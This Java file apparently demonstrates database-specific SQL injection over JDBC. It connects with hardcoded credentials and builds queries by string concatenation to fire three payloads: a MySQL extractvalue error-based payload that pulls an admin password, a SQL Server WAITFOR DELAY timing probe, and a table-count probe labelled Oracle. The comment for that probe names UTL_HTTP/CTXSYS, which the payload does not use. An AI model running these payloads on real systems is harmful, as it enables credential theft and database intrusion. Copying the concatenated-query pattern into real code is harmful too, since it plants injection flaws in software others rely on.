// Database-Specific SQL Injection via JDBC
// Payloads tuned for a particular RDBMS (MySQL, SQL Server, Oracle, PostgreSQL).

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class database_specific_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // MySQL-specific: extractvalue/updatexml error-based exfiltration
        String mysqlPayload = "1 AND extractvalue(1, concat(0x7e, (SELECT password FROM admins LIMIT 1)))";
        try {
            st.executeQuery("SELECT id FROM users WHERE id = " + mysqlPayload);
        } catch (Exception e) {
            System.out.println("MySQL error leak: " + e.getMessage());
        }

        // SQL Server-specific: WAITFOR DELAY time-based probe
        String mssqlPayload = "1; WAITFOR DELAY '0:0:3'--";
        try {
            long start = System.currentTimeMillis();
            st.executeQuery("SELECT id FROM users WHERE id = " + mssqlPayload);
            long elapsed = System.currentTimeMillis() - start;
            System.out.println(elapsed > 2000 ? "SQL Server delay fired (" + elapsed + " ms)" : "Not SQL Server");
        } catch (Exception e) {
            System.out.println("MS-SQL payload not valid on this server: " + e.getMessage());
        }

        // Oracle-specific: UTL_HTTP/CTXSYS error payload attempt
        String oraclePayload = "1 AND (SELECT COUNT(*) FROM user_tables) > 0";
        try {
            ResultSet rs = st.executeQuery("SELECT id FROM users WHERE id = " + oraclePayload);
            System.out.println(rs.next() ? "Oracle-style table probe true" : "No rows");
            rs.close();
        } catch (Exception e) {
            System.out.println("Oracle payload rejected: " + e.getMessage());
        }

        st.close();
        con.close();
    }
}
